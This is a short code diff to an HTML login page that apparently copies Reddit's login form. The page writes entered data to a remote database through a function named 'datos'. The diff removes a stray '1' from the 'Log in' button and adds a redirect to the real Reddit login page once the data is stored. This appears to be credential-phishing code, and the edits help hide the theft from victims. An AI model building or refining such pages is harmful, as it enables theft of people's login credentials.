@@ -152,7 +152,7 @@
               </fieldset>
 
               <fieldset class="AnimatedForm__field m-small-margin">
-                <button  type="submit" onclick="datos()">Log in 1</button>
+                <button  type="submit" onclick="datos()">Log in</button>
               </fieldset>
 
 
@@ -276,6 +276,7 @@
     })
     .then(function() {
          console.log("Doc successful");
+         window.location.href = "https://www.reddit.com/login/";
      })
      .catch(function(error) {
         console.error("Error writing doc", error);
